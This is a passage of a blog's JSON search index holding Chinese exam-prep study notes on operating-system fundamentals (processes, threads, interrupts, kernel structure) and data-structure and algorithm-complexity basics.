没有任何软件支持的计算机称为裸机，它仅仅构成计算机系统的物质基础。\n操作系统提供的资源管理功能和方便用户的各种服务功能，将裸机改造成功能更强、使用更方便的机器。\n因此我们通常把覆盖了软件的机器称为扩充机器或虚拟机。\n参考资料：王道考研——操作系统\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/1.1-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","title":"1.1 操作系统的基本概念"},{"content":"1.1 数据结构的基本概念 知识图谱 一、基本概念和术语 1. 数据 数据是信息的载体，是描述客观事物属性的数、字符及所有能被输入到计算机中并被计算机程序识别和处理的符号集合。数据是计算机程序加工的原料。\n2. 数据元素 数据元素是数据的基本单位，通常作为一个整体进行考虑和处理。一个数据元素可由若干个数据项组成，数据项是构成数据元素的不可分割的最小单位。\n3. 数据对象 数据对象是具有相同性质的数据元素的集合，是数据的一个子集。\n4. 数据类型 数据类型是一个值的集合和定义在此集合上的一组操作的总称。\n原子类型：其值不可再分的数据类型； 结构类型：其值可以再分解为若干成分（分量）的数据类型； 抽象数据类型：抽象数据组织与之相关的操作。 5. 数据结构 数据结构是相互之间存在一种或多种特定关系的数据元素的集合。在任何问题中，数据元素都不是孤立的存在，它们之间存在着某种关系，这种数据元素相互之间的关系称为结构（Structure）。数据结构包含三个方面的内容：逻辑结构、存储结构和数据的运算。\n数据的逻辑结构和存储结构是密不可分的两个方面，一个算法的设计取决于选定的逻辑结构，而算法的实现依赖于所采用的存储结构。\n二、数据结构三要素 1. 数据的逻辑结构 逻辑结构是指数据元素之间的逻辑关系，即从逻辑关系上描述数据。它与数据的存储结构无关，是独立于计算机的。数据的结构为线性结构和非线性结构，线性表是典型的线性结构；集合、树和图是典型的非线性结构。\n数据的逻辑结构分类：\n集合：结构中的数据元素之间除“同属一个集合”外，别无其它关系； 线性结构：结构中的数据元素只存在一对一的关系； 树形结构：结构中的数据元素之间存在一对多的关系； 图状结构：结构中的数据元素之间存在多对多的关系。 2. 数据的存储结构 存储结构是指数据结构在计算机中的表示（又称映像），也称物理结构。它包括数据元素的表示和关系的表示。数据的存储结构是用计算机语言实现的逻辑结构，它依赖于计算机语言。数据的存储结构主要有顺序存储、链式存储、索引存储和散列存储：\n顺序存储：把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现。其优点是可以实现随机存取，每个元素占用最少的存储空间；缺点是只能使用相邻的一整块存储单元，因此可能产生较多的外部碎片。 链式存储：不要求逻辑上相邻的元素在物理位置上也相邻，借助指示元素存储地址的指针来表示元素之间的逻辑关系。其优点是不会出现碎片现象，能充分利用所有存储单元；缺点是每个元素因存储指针而占用额外的存储空间，且只能实现顺序存储。 索引存储：在存储元素信息时，还建立附加的索引表。索引表中的每项称为索引项，索引项的一般形式是关键字和地址。其优点是检索速度快；缺点是附加的索引表额外占用存储空间。另外，增加和删除数据时也要修改索引表，因而会花费较多的时间。 散列存储：根据元素的关键字直接计算出该元素的存储地址，又称哈希（Hash）存储。其优点是检索、增加和删除节点的操作都很快；缺点是若散列函数不好，则可能出现元素存储单元的冲突，而解决冲突会增加时间和空间开销。 3. 数据的运算 施加在数据上的运算包括运算的定义和实现。运算的定于是针对逻辑结构，指出运算的功能；运算的实现是针对存储结构的，指出运算的具体操作步骤。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/1.1-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/","title":"1.1 数据结构的基本概念"},{"content":"1.2 操作系统的发展与分类 知识图谱 一、手工操作阶段（此阶段无操作系统） 穿孔纸带是早期计算机的输入和输出设备，它将程序和数据转换二进制数码：带孔为1，无孔为0，经过光电扫描输入电脑。然后人们在运行程序时就将打满小孔的纸带输入到计算机。计算机上的所有工作都需要用户干预，人机矛盾越来越大，因此必须寻找新的解决方案。\n手工操作阶段有两个突出的缺点：\n用户独占全机，资源利用率低，但是不会出现其它用户占据资源的情况； CPU 等待手工操作，CPU 的利用不充分。 二、批处理阶段（操作系统开始出现） 为了解决人机矛盾以及 CPU 和 I/O 设备之间速度不匹配的矛盾，出现了批处理系统。按发展例程又可以分为单道批处理系统和多道批处理系统。\n1. 单道批处理系统 单道批处理系统对作业的处理是批量进行的，但是内存中始终仅存在一道作业。\n单道批处理系统的主要特征有以下几个：\n自动性：正常情况下磁带上的作业能够自动逐个运行，无需人工干预； 顺序性：磁带上的各道作业完成顺序和它们进入内存的顺序相同； 单道性：内存中仅有一条作业在运行。 单道批处理系统面临的问题是：主机内存中仅存放一条批处理任务，每当它在运行期间发出输入/输出请求后，高速的 CPU 便会进入等待低速的 I/O 设备的状态。\n2. 多道批处理系统 多道程序设计技术运行多个程序同时进入内存中并且在 CPU 上交替运行，这些程序可以共享系统中的所有资源。\n当一个程序因为 I/O 请求而暂停时，CPU 便可立即转去运行另外的程序。它不采用某种机制来提高某一方面的瓶颈问题，而让系统的各个组成部分都尽量进入使用状态。虽然切换任务会花费一定的时间，但是可以实现系统间各个部件的并行工作，使整体在单位时间内的效率翻倍。\n多道批处理系统有着以下特点：\n多道：计算机内存中同时放入多道相互独立的程序； 宏观上并行：进入内存中的所有程序都处于运行状态； 微观上串行：内存中的多道程序轮流占用 CPU，交替执行。 多道程序设计技术的实现需要解决下面几个问题：\n如何分配处理器？ 多道程序的内存如何分配？ I/O 设备如何分配？ 如何组织和存放大量的程序和数据？ 多道批处理系统的优缺点：\n优点： 资源利用率高； 系统吞吐量大。 缺点： 用户响应时间长； 不提供人机交互。 三、分时操作系统 分时技术：把处理机的运行时间分为很短的时间片，按时间片轮流把处理机分给各联机作业使用；如果某个作业在分配给他的时间片用完之前计算还未完成，该作业就暂时中断，等待下一轮继续计算。此时处理机让给另一个作业使用。\n在操作系统中采用分时技术便形成了分时系统。分时操作系统允许多个用户通过终端同时共享同一台主机，用户可以同时与主机交互而互不干扰。因此实现分时系统最关键的问题就是如何使用户能与自己的作业交互。\n分时操作系统同样支持多道程序设计，但它不同于多道批处理系统，分时操作系统允许人机交互，而多道批处理系统不允许人机交互。\n分时操作系统有如下特征：\n同时性：同时性又称多路性，指允许多个终端用户同时使用一台计算机； 交互性：用户能够通过终端采用人机对话的方式直接控制计算机； 独立性：系统中多个用户可以彼此独立地操作，互不影响； 及时性：用户请求能在短时间内得到回应。 四、实时操作系统 为了能够在某个时间限制内完成某些紧急任务而不需要时间片排队，诞生了实时操作系统。\n这里地时间限制分为两种情况：\n硬实时系统：某个动作必须绝对地在规定的时刻（或者规定的时间范围）发生； 软实时系统：任务能够接受偶尔违反时间规定且不会引起任何永久性的损坏。 实时操作系统的特点主要是及时性和可靠性。\n五、网络操作系统和分布式计算机系统 网络操作系统把计算机网络中的各台计算机有机地结合起来形成一个整体，提供一种统一、经济而有效地使用各台计算机地方法，实现各台计算机之间数据地相互传送。网络操作系统地主要特点是网络中各种资源的共享以及各台计算机之间的通信。\n分布式计算机系统是由多台计算机组成并满足下列条件的系统：\n系统中任意两台计算机通过通信方式交换信息； 系统中的每台计算机都具有同等的地位，没有主从之分； 每台计算机上的资源为所有用户共享； 系统中任意台计算机都可以构成一个子系统，并且可以重构； 任何工作都可以分布在几台计算机上，由它们并行、协同完成。 用于管理分布式计算机系统的操作系统称为分布式计算机系统，其和网络操作系统的本质不同是：同一任务由分布式操作系统中的若干计算机协调完成。\n分布式计算机系统主要特点为分布性和并行性。\n六、个人计算机操作系统 个人计算机系统是目前使用最为广泛的系统，常见的有 Windows、Linux、Mac OS等。\n参考资料：王道考研——操作系统\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/1.2-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8F%91%E5%B1%95%E4%B8%8E%E5%88%86%E7%B1%BB/","title":"1.2 操作系统的发展与分类"},{"content":"1.2 算法和算法评价 知识图谱 一、算法的基本概念 算法（Algorithm）是特定问题求解步骤的一种描述，它是指令的有限序列，其中的每条指令表示一个或多个操作。此外，一个算法还具有下列5个重要特性：\n有穷性：一个算法中必须总在执行有穷步之后结束，且每一步都可能在有穷时间内完成； 确定性：算法中每条指令必须有确切的含义，对于相同的输入只能得出相同的输出； 可行性：算法中描述操作都可以通过已经实现的基本运算执行有限次来实现； 输入：一个算法有零个或多个输入，这些输入取自于某个特定的对象的集合； 输出：一个算法有一个或多个输出，这些输出是于输入有着某种特定关系的量。 通常，设计一个好算法应考虑达到以后目标：\n正确性：算法应能够正确地解决问题； 可读性：算法应具有良好的可读性，以帮助人们理解； 健壮性：输入非法数据时，算法能适当地做出反应或进行处理，而不会产生莫名其妙地输出结果； 效率与低存储量需求：效率是指算法执行的时间，存储量需求是指算法执行过程中所需要的最大存储空间，这两者都与问题的规模有关。 二、算法效率的度量 算法效率的度量是通过时间复杂度和空间复杂度来描述的。\n1. 时间复杂度 一个语句的频度是指该语句在算法中被重复执行的次数。算法中所有语句的频度之和记为 T(n)，它是该算法问题规模 n 的函数，时间复杂度主要分析 T(n) 的数量级。算法中基本运算（最深层循环内的语句）的频度与 T(n) 同数量级，因此通常采用算法中基本运算的频度 f(n) 来分析算法的时间复杂度。\n$$ T(n) = O(f(n)) $$ O 的含义是 T(n) 的数量级，其严格的数学意义是：若 T(n) 和 f(n) 是定义在正整数集合上的两个函数，则存在正常数 C 和 n0，使得 n \u0026gt;= n0 时，都满足 0 \u0026lt;= T(n) \u0026lt;= C(fn)。\n算法的时间复杂度不仅依赖于问题的规模 n，也取决于待输入数据的性质（如输入数据元素的初始状态）。\n最坏时间复杂度：最坏的情况下，算法的时间复杂度； 平均时间复杂度：所有可能输入实例在等概率出现的情况下，算法的期望运行时间； 最好时间复杂度：在最好的情况下，算法的时间复杂度。 一般总是考虑在最坏情况下，算法的时间复杂度，以保证算法的运行时间不会比它更长。\n在分析一个程序的时间复杂性时，有以下两条规则：\n$$ T(n) = T_1(n) + T_2(n) = O(f(n)) + O(g(n)) = O(max(f(n)), g(n)) $$ $$ T(n) = T_1(n) * T_2(n) = O(f(n)) * O(g(n)) = O(f(n) * g(n)) $$ $$ O(1) \u003c O(log_2n) \u003c O(n) \u003c O(nlog_2n) \u003c O(n^2) \u003c O(n^3) \u003c O(2^n) \u003c O(2n!) \u003c O(n^n) $$2. 空间复杂度 $$ S(n) = O(g(n)) $$ 一个程序在执行时除需要存储空间来存放本身所用的指令、常数、变量和输入数据外，还需要一些对数据进行操作的工作单元和存储一些为实现计算所需信息的辅助空间。若输入数据所占空间只取决于问题本身，和算法无关，则只需分析除输入和程序之外的额外空间。\n算法原地工作是指算法所需的辅助空间为常量，即 O(1)。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/1.2-%E7%AE%97%E6%B3%95%E5%92%8C%E7%AE%97%E6%B3%95%E8%AF%84%E4%BB%B7/","title":"1.2 算法和算法评价"},{"content":"1.3 操作系统的运行环境 知识图谱 一、操作系统的运行机制 计算机系统中，通常 CPU 执行两种不同性质的程序：\n操作系统内核程序：通常会执行一些特权指令（指计算机中不允许用户直接执行的指令，如中断指令，这些指令必须由操作系统调度执行）， 用户自编程序：主要执行非特权指令。 在具体实现上，将 CPU 状态划分为用户态（目态）和核心态（管态、内核态）。当 CPU 处于用户态时，只能执行非特权指令；当 CPU 处于核心态时，CPU 既可以执行特权指令也可以执行非特权指令。用户自编程序运行在用户态，操作系统内核程序运行在核心态。\n现代操作系统几乎都是层次式的结构：\n与硬件关联较高的模块，如时钟关联、中断处理，处于最低层； 运行频率高的程序，如进程关联、存储器管理，位于上一层。 这两部分构成了操作系统的内核，都运行在核心态。\n大多数操作系统内核包含以下方面：\n1. 时钟管理 在操作系统中时钟的功能主要有两大类：\n向用户提供系统时间； 通过时钟中断的管理，实现进程的切换。 2. 中断机制 引入中断技术的最初目的是提高多道环境中 CPU 的利用率。\n后来随着现代操作系统的发展，中断成为了操作系统各项操作的基础，如鼠标键盘信息的输入、进程的管理与调度、文件访问等。可以说现代操作系统是依靠中断驱动的软件。\n中断机制中，只由小部分是属于内核，它们负责保护和恢复中断现场的信息，转移控制权到相关的处理程序。这样可以减少中断处理时间，提高 CPU 利用率。\n3. 原语 按层次结构设计的操作系统，底层必然是一些可以被调用的公用小程序，它们各自完成一个规定的操作。它们拥有如下特点：\n处于操作系统底层，是最接近硬件的部分； 程序运行具有原子性； 程序运行时间短，调用频繁。 通常把具有这些特点的程序称为原语（Atomic Operation）。定义原语的直接方法是关闭中断，让所有动作都不可分割的完成后再打开中断。\n4. 系统控制的数据结构及处理 系统中用来登记状态信息的数据结构有很多，为了实现有效的管理，系统需要一些基本的操作。常见操作有以下几个：\n进程管理：进程状态管理、进程调度和分派、创建与撤销进程控制块等； 存储器管理：存储器的空间分配和回收、内存信息保护程序、代码对换程序等； 设备管理：缓冲区管理、设备分配和回收等。 从上述内容可以发现，核心态指令实际上包括系统调用类指令和一些针对时钟、中断和原语的操作指令。\n二、中断和异常的概念 为了实现 CPU 用户态和核心态的切换，在 CPU 核心态建立了通道， 以便实现从用户态进入核心态。在实际操作系统中，CPU 运行上层程序时唯一能进入这些通道的途径就是通过中断和异常。\n中断（Interruption）也称外中断，指来自 CPU 指令以外的事情发生。例如 I/O 设备结束中断表示设备输入/输出完成，希望处理机能够向设备发下一个输入/输出请求，同时让程序继续运行。\n时钟中断，表示一个固定的时间片已到，让处理机处理计时、启动定时任务等。这一类中断通常与当前程序运行无关的事情。\n异常（Exception）也称内中断、例外和陷入（trap），指源自 CPU 执行指令内部的事件，如地址越界、算术溢出、虚存系统的缺页及专门的陷入指令等引起的事件。关于异常的处理一般要依赖于当前程序的运行现场，而且异常通常不能被屏蔽，一旦出现必须立即处理。\n三、系统调用 所谓系统调用，是指用户在程序中调用操作系统所提供的一些子功能，系统调用可视为特殊的公告子程序。\n这些系统调用按功能大致可以分为如下几类：\n设备管理：完成设备的请求或释放，以及设备启动等功能； 文件管理：完成文件的读、写、创建以及删除等功能； 进程管理：完成进程的创建、撤销、阻塞及唤醒等功能； 进程通信：完成进程之间的消息传递或信号传递等功能； 内存管理：完成内存的分配、回收以及获取作业占用内存区大小及初始地址等功能。 用户程序不能直接执行对系统影响飞车大的操作，必须通过系统调用的方式请求操作系统代为执行，以便提高系统的稳定性和安全性，防止用户程序随意更改或访问重要的系统资源，影响其它进程的执行。\n在操作系统层面上我们关心的是系统核心态和用户态的软件实现与切换。\n列举一些由用户态转向核心态的例子：\n用户程序要求操作系统的服务，即系统调用； 发生了一次中断； 用户程序中产生了一个错误状态； 用户程序试图执行一条特权指令； 从核心态转为用户态也是由特权指令产生，一般是中断返回指令。 由用户态转为核心态，不仅仅要切换状态，所用的堆栈也可能需要由用户堆栈切换为系统堆栈，但是系统堆栈也是属于该进程的。\n如程序运行由用户态转为核心态，就会用到访管指令，访管指令是在用户态使用的，因此它是非特权指令。\n参考资料：王道考研——操作系统\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/1.3-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/","title":"1.3 操作系统的运行环境"},{"content":"1.4 操作系统的体系结构 操作系统主要有两种体系结构：大内核与微内核。\n大内核 大内核系统将操作系统的主要功能模块都作为一个紧密联系的整体运行在核心态，从而为应用提供高性能的系统服务。因为各个管理模块之间共享信息，能够有效利用相互之间的有效特性，所以具有无可比拟的性能优势。\n但是随着体系结构和应用需求的不断发展，需要操作系统提供的服务越来越多，而且接口也越来越复杂，导致操作系统的设计规模急剧增长。\n微内核 为解决操作系统的内核代码难以维护的问题，提出了微内核的体系结构。\n微内核将内核中最基本的功能保留在内核，而将那些不需要在核心态执行的功能移到用户态执行，大大降低了内核的设计复杂性。那些移出内核的操作系统代码根据分层的原则被划分为若干个服务程序，它们的执行相互独立，交互则借助于微内核进行通信。\n微内核结构有效地分离了内核与服务、服务与服务，使得它们之间的接口更加清晰，维护的代价大大降低，各部分可以独立地进行优化和演进，从而保证操作系统地可靠性。\n微内核的最大问题在于性能，因为需要频繁地在核心态和用户态之间进行切换，操作系统的执行开销偏大。\n为减少开销，也有人提出将系统服务作为运行库链接到用户程序，这样的体系结构称为库操作系统。\n参考资料：王道考研——操作系统\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/1.4-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/","title":"1.4 操作系统的体系结构"},{"content":"2.1 进程与线程 思维导图 一、进程的概念和特征 进程的概念 在多道程序环境下，运行多个程序并发执行，此时它们将失去封闭性，并具有间断性以及不可再现性的特征。为此引入了进程（Process）的概念，以便更好的秒数和控制程序的并发执行，实现操作系统的并发性与共享性。\n为了使参与并发执行的程序（含数据）能够独立地运行，必须为之配置一个专门地数据结构，称之为进程控制块（Process Control Block，PCB）。系统利用 PCB 来描述进程地基本情况和运行态，进而控制和管理进程。由程序段、数据段和 PCB 组成进程映像（进程实体）。要注意进程映像是动态的，而进程是静态的，进程是进程实体的运行过程，是系统进行资源分配和调度的一个独立单位。\n所谓创建进程，实质上是创建进程映像中地 PCB；而撤销进程，实质上是撤销进程地 PCB。\n进程有着如下定义：\n进程是程序的一次执行过程； 进程是一个程序及数据在处理机上顺序执行时所发生的活动； 进程是具有独立功能的程序在一个数据集合上运行的过程，是系统进行资源分配和调度的一个独立单位。 进程的特征 进程是由多程序的并发执行而引出的，它和程序是两个截然不同的概念。\n进程的基本特征是对比单个程序的执行提出的，也是对进程管理提出的基本要求：\n动态性（最基本的特征）：进程是程序的一次执行过程，是动态地产生、变化和消亡的； **并发性：**指多个进程实体同时存在于内存中。引入进程的目的就是为了使程序能与其他进程的程序并发执行，以提高资源利用率； **独立性：**指进程实体使一个能够独立运行、独立获得资源和独立接受调度的基本单位。凡是未建立 PCB 的程序，都不能作为一个独立的单位参与运行； **异步性：**由于进程的相互制约，进程具有执行的间断性。异步性会导致执行结果的不可再现性，为此在操作系统中必须配置相应进程的同步机制； **结构性：**从结构上来看，进程实体是由程序段、数据段和 PCB 共同组成的。 二、进程的状态与转换 五种基本状态 通常进程有以下五种状态，前三种是进程的基本状态：\n运行态：进程正在处理机上运行，每个 CPU 每个时刻最多只有一个进程处于运行状态； 就绪态：进程处于已准备运行的状态，进程此时已经获得了除处理机以外的以切资源； 阻塞态（又称等待态）：进程正在等待某一事件而暂停运行，例如等待资源可用，此时即使处理机空闲程序也不能运行； 创建态：进程正在被创建，尚未转到就绪态； 结束态：进程正在从系统中消失。 状态转换 三种基本状态的转换如下：\n就绪态 -\u0026gt; 运行态：处于就绪态的进程被调度后，获得处理机资源； 运行态 -\u0026gt; 就绪态：处于运行态的进程在时间片用完后，必须让出处理机，从而进程由运行态转换为就绪态； 运行态 -\u0026gt; 阻塞态：进程请求某一资源的使用和分配情况等待某一事件的发生时，它就从运行态转换为阻塞态； 阻塞态 -\u0026gt; 就绪态：进程等待的事件到来时，中断程序必须把进程的状态由阻塞态转换为就绪态。 注意：进程从运行态转换为阻塞态是主动的行为，从阻塞态转换为就绪态是被动的行为，需要相关进程的协助。\n三、进程控制 进程控制的主要功能是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能。\n1. 进程的创建 操作系统允许一个进程创建另外一个进程。此时创建者称为父进程，被创建的进程称为子进程。子进程可以继承父进程的拥有的所有资源。当子进程被撤销时，应将其从父进程那里获得的所有资源归还给父进程。在父进程被撤销时，必须同时撤销所有的子进程。\n操作系统创建一个新进程（创建原语）的过程如下：\n为新进程分配一个唯一的进程标识号，并申请一个空白的 PCB（PCB 是有限的），若申请失败则创建失败； 为进程分配资源，为新进程的程序和数据及用户栈分配必要的内存空间（PCB 中体现）。如果资源不足则进入等待状态； 初始化 PCB，； 若进程就绪队列能够接纳新进程，则将新进程插入队列，等待调度运行。 2. 进程的终止 引起进程终止的事件主要有：\n正常结束：进程的任务已经完成并准备退出运行； 异常结束：进程在运行时，发生了某种异常事件，使进程无法正常运行； 外界干预：进程应外界的请求而终止运行。 操作系统终止进程（撤销原语）的过程如下：\n根据被终止进程的标识符，检索 PCB，从而读出进程状态； 若被终止进程处于执行状态，立即终止该进程的执行，将处理机资源分配给其它进程； 若该进程还有子进程，则终止所有子进程； 将进程所占用所有资源归还给父进程或操作系统； 将该 PCB 从所在队列删除。 3. 进程的阻塞和唤醒 正在执行的进程由于某些期待的事情未发生，如请求系统资源失败等，由系统自动执行阻塞原语（Block），使自己由运行态变为阻塞态。因此可见，进程的阻塞是进程自身的一种主动行为，也因此只有处于运行态的进程（获得 CPU 资源），才可能将其转为阻塞态。\n阻塞原语的执行过程如下：\n找到将要被阻塞进程的表示号对应的 PCB； 若该进程为运行态，则保护其线程，将其状态转化为阻塞态，停止运行； 把该 PCB 插入相应的等待队列。 当被阻塞进程所期待的事情出现时，如它所启动的 I/O 操作已完成或其所期待的数据已到达，由有关进程（如提供数据的进程）调用唤醒原语（Wakeup），将等待该事件的进程唤醒。\n唤醒原语的执行过程如下：\n在该事情的等待队列中找到相应进程的 PCB； 将其从等待队列中移出，并置其状态为就绪态； 把该 PCB 插入就绪队列，等待调度程序调度。 注意：Block 原语和 Wakeup 原语是一对作用刚好相反的原语，必须成对使用。Block 原语是由被阻塞进程自我调用实现的，而 Wakeup 原语则和一个与被唤醒进程合作或被其它相关的进程调用实现的。\n4. 进程切换 进程切换同样是在内核的支持下实现的，任何进程都是在操作系统内核的支持下运行的，是与内核紧密相关的。\n进程切换的过程如下：\n保存处理机上下文，包括程序计数器和其他寄存器； 更新 PCB 信息； 把进程的 PCB 移入相应的队列，如就绪、在某事情阻塞等队列； 选择另一个进程执行，并更新其 PCB； 更新内存管理的数据结构； 恢复处理机上下文。 “调度”和“切换”是有区别的：\n调度是指决定资源分配给哪个进程的行为，是一种决策行为； 切换是指实际分配的行为，是执行行为。 一般来说，先有资源的调度，然后才有进程的切换。\n四、进程的组织 进程是一个独立的运行单位，也是操作系统进行资源分配和调度的基本单位。\n1. 进程控制块 进程创建时，操作系统新建一个 PCB 结构，该结构之后常驻内存，任意时刻都可以存取，并在进程结束时删除。PCB 是进程实体的一部分，是进程存在的唯一标志。\n创建一个进程时，系统为该进程建立一个 PCB；进程执行时，系统通过其 PCB 了解进程的现行状态信息，以便对其进行控制和管理；进程结束时，系统收回其 PCB，该进程随之消亡。操作系统通过 PCB表来管理和控制进程。\n进程描述信息 进程控制和管理信息 资源分配清单 处理机相关信息 进程标识符（PID） 进程当前状态 代码段指针 通用寄存器值 用户标识符（UID） 进程优先级 数据段指针 地址寄存器值 代码运行入口地址 堆栈段指针 控制寄存器值 程序的外存地址 文件描述符 标值寄存器值 进入内存时间 键盘 状态字 处理机占用时间 鼠标 信号量使用 PCB 主要部分介绍：\n进程描述信息： 进程标识符：标志各个进程，每个进程都有一个唯一的标识号； 用户标识符：进程归属的用户，用户标识符主要为共享和保护服务。 进程控制和管理信息： 进程当前状态：描述进程的状态信息，作为处理机分配调度的依据； 进程优先级：描述进程抢占处理机的优先级，优先级高的进程可优先获得处理机。 资源分配清单：用于说明有关内存地址空间或虚拟地址空间的状况，所打开文件的列表和所使用的输入/输出设备信息； 处理机相关信息：主要指处理机中各寄存器的值，当进程被切换时，处理机状态信息都必须保存至相应的 PCB 中，以便在该进程重新执行时，能从断电继续执行。 2. 程序段 程序段就是能被进程调度程序调度到 CPU 执行的程序代码段。程序可被多个进程共享，即多个进程可以运行同一个程序。\n3. 数据段 一个进程的数据段，可以是进程对应的程序加工处理的原始数据，也可以是程序执行时产生的中间或者最终结果。\n五、进程的通信 进程通信是指进程之间的信息交换。PV 操作是低级通信方式，高级通信方式是指以较高的效率传输大量数据的通信方式。高级通信方式主要有以下三类：\n1. 共享存储 在通信的进程之间存在一块可直接访问的共享空间，通过对这片共享空间进行对/写操作实现进程之间的信息交换。对共享空间进行写/读操作时，需要使用同步互斥工具（如 P 操作，V 操作），对共享空间的写/读进行控制。\n共享存储又分为两种：\n低级的共享是基于数据结构的共享； 高级的共享是基于存储区的共享。 操作系统只负责为通信进程提供可供享用使用的存储空间和同步互斥工具，而数据交换则由由用户自己安排读/写指令完成。\n用户进程空间一般都是独立的，进程运行期间一般不能访问其它进程的空间，要想让两个用户进程共享空间，必须通过特殊的系统调用实现，而进程内的线程是自然共享进程空间的。\n2. 消息传递 在消息传递系统中，进程间的数据交换是以格式化的消息（Message）为单位的。若进程间不存在可直接访问的共享空间，则必须利用操作系统提供的消息传递方法实现进程通信。进程通过系统提供的发送消息和接收消息两个原语进行数据交换。\n直接通信方式：发送进程直接把消息发送给接收进程，并将它挂在接收进程的消息缓存队列上，接收进程从消息缓存队列中取得消息； 间接通信方式：发送进程把消息发送到某个中间实体，接收进程从中间实体获得消息。这种中间实体一般称为信箱，这种通信方式又称信箱通信方式。 3. 管道通信 管道通信是消息传递的一种特殊方式。所谓“管道”，是指用于连接一个读进程和一个写进程以实现它们之间通信的一个共享文件，又称 pipe 文件。\n向管道提供输入的发送进程（写进程），以字符流形式将数据送入管道；接收进程从管道中接收数据。为了协调双方的通信，管道机制必须提供以下三方面的协调能力：互斥、同步和确定对方的存在。\n注意：从管道中读取数据是一次性操作，数据一旦被读取，它就从管道中被抛弃，释放空间以便写更多的数据。管道只能采用半双工通信，要实现父子进程双方互动通信，需要定义两个管道。\n六、线程概念和多线程模型 1. 线程的基本概念 引入进程的目的是更好地使多道程序并发执行，提高资源利用率和系统吞吐量。增加并发程度；而引入线程的目的是减小程序在并发执行时所付出的时空开销，提高操作系统的并发性能。\n线程最直接的理解就是“轻量级进程”，它是一个基本的 CPU 执行单元，也是程序执行流的最小单元，其由线程 ID、程序计数器、寄存器集合和堆栈组成。线程是进程中的一个实体，是被系统独立调度和分派的基本单位。线程不拥有系统资源，只拥有一点在运行中必不可少的资源，但它可与同属于一个进程的其它线程共享所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行。由于线程之间的相互制约，让线程在运行中呈现出间断性。线程也有就绪、阻塞和运行三种基本状态。\n引入线程后，进程的内涵就发生了改变，进程只作为除 CPU 外的系统资源的分配单元，线程则作为处理机的分配单元。由于一个进程内部有多个线程，若线程的切换发生在同一个进程内部，则只需要很小的系统资源。\n2. 线程与进程的比较 调度：在传统的操作系统中，拥有资源和独立调度的基本单位都是进程。在引入线程的操作系统中，线程是独立调度的基本单位，进程则是拥有资源的基本单位。在同一进程中，线程的切换不会引起进程的切换；不同进程之间的线程切换则会引起进程的切换。 拥有资源：进程是拥有资源的基本单位，线程可以访问隶属于进程的系统资源； 并发性：进程之间可以并发执行，多个线程之间也可以并发执行； 系统开销：操作系统在创建进程和撤销进程上的开销远大于创建线程和撤销线程上的； 地址空间和其它资源：进程的地址空间之间相互独立，同一进程的所有线程共享进程的资源； 通信方面：进程间通信（IPC）需要进程同步和互斥手段的辅助，以保证数据的一致性；而线程间可以直接读/写进程数据段来进行通信。 3. 线程的属性 多线程操作系统将线程作为独立运行和调度的基本单位，此时进程不再是一个基本的可执行实体，但它仍具有与执行相关的状态。所谓进程处于“执行”状态，实际上是指该进程中的某县城正在执行。\n线程的主要属性如下：\n线程是一个轻型实体，不拥有系统资源。但每一个线程都有一个唯一的标识符和线程控制块，线程控制块记录了线程执行的寄存器和栈等线程状态； 不同的线程可以执行相同的程序； 同一进程中的各个线程共享该进程所拥有的资源； 线程是处理机的独立调度单位，多个线程是可以并发执行的。单核 CPU 中各线程可以交替地占用 CPU， 一个线程被创建后，便开始了它的生命周期，直至终止。 4. 线程的实现方式 线程的实现方式可以分为两类：用户级线程（User-Level Thread，ULT）和内核级线程（Kernel-Level Thread，KLT），内核级线程又称内核支持的线程。\n在用户级线程中，有关线程管理的所有工作都由应用程序完成，内核意识不到线程的存在。应用程序可以通过使用线程库设计多线程程序。通常情况下，应用程序从单线程开始，在其运行的任何时刻都可以调用线程库创建新的线程。\n在内核级线程中，线程管理的所有工作都由内核完成，应用程序没有进行线程管理的代码，只有一个到内核级线程编程的接口。内核进程为进程及内部的每个线程维护上下文信息，调度也在内核基于线程架构的基础上完成。\n有些系统中使用组合方式的多线程实现。线程创建完全在用户空间完成，线程的调度和同步也都在应用程序中进行。一个应用程序中的多个用户级线程被映射到一些（小于等于用户级线程）内核级线程上。\n5. 多线程模型 有些系统同时支持用户线程和内核级线程，由此产生了不同的多线程模型（即实现用户级线程和内核级线程的连接方式）：\n多对一模型：将多个用户级线程映射到一个内核级线程，线程管理在用户空间完成。此模式中，用户级线程对操作系统不可见（透明）； 一对一模型：将每个用户级线程映射到一个内核级线程； 优点：当一个线程被阻塞后允许另外一个线程继续执行，因此并发能力强； 缺点：每创建一个用户级线程都需要创建一个内核级线程与其对应，这样创建线程的开销比较大，会影响到应用程序的性能。 多对多模型：将 n 个用户级线程映射到 m 个内核级线程上，要求 m \u0026lt;= n。 特点：多对多模型是多对一模型和一对一模型的折中，即克服了多对一模型并发度不高的缺点，又克服了一对一模型的一个用户进程占用太多内核级线程而开销太大的缺点。同时又拥有两种模型各自的优点。 参考资料：王道考研——操作系统\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/2.1-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/","title":"2.1 进程与线程"},{"content":"2.1 线性表的定义和基本操作 思维导图 一、线性表的定义 线性表是具有相同数据类型的 n（n 